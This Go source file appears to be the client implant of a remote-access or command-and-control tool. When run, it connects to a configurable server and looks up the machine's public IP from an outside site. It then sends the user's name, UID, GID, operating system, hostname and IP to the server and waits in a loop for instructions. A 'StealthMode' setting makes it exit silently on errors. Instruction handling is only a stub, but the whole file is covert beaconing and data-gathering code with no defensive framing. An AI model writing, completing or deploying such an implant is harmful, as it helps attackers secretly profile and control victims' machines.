package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
)

type Client struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
	PublicIP        string
}

type Instructions struct {
	IsHeartbeat bool
	Message     string
}

type Response struct {
	Message string
}

var (
	StealthMode bool = false
	RemoteIP         = "127.0.0.1"
	RemotePort       = "1302"
)

func main() {
	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
	if err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatalf("Error happened connecting to server: %v\n", err)
		}
	}
	defer conn.Close()
	if err := sendOSInfo(conn); err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatal(err)
		}
	}
	for {
		if err := awaitInstructions(conn); err != nil {
			if StealthMode == true {
				os.Exit(0)
			} else {
				log.Fatalf("Error happened awaiting instructions: %v\n", err)
			}
		}
	}
}

func getIP() (string, error) {
	res, err := http.Get("https://ip.bulgariu.xyz")
	if err != nil {
		return "", nil
	}
	resbody, err := io.ReadAll(res.Body)
	if err != nil {
		return "", nil
	}
	return string(resbody), nil
}

func sendOSInfo(conn net.Conn) error {
	currentUser, err := user.Current()
	if err != nil {
		e := fmt.Errorf("Error happened getting user: %v\n", err)
		return e
	}

	clientHostname, err := os.Hostname()
	if err != nil {
		e := fmt.Errorf("Error happened getting hostname: %v\n", err)
		return e
	}

	ip, err := getIP()
	if err != nil {
		e := fmt.Errorf("Error happened pulling IP: %v\n", err)
		return e
	}

	newClient := Client{
		Username:        currentUser.Username,
		UID:             currentUser.Uid,
		GID:             currentUser.Gid,
		OperatingSystem: runtime.GOOS,
		Hostname:        clientHostname,
		PublicIP:        ip,
	}

	enc := gob.NewEncoder(conn)
	err = enc.Encode(newClient)
	if err != nil {
		e := fmt.Errorf("Error happened sending OS info to server: %v\n", err)
		return e
	}

	return nil
}

func awaitInstructions(conn net.Conn) error {
	dec := gob.NewDecoder(conn)
	inst := Instructions{}
	err := dec.Decode(&inst)
	if err != nil {
		return err
	}
	if inst.IsHeartbeat == true {
		return nil
	}
	return nil
}

func sendMessage(resp Response, conn net.Conn) error {
	enc := gob.NewEncoder(conn)
	err := enc.Encode(&resp)
	if err != nil {
		return err
	}
	return nil
}
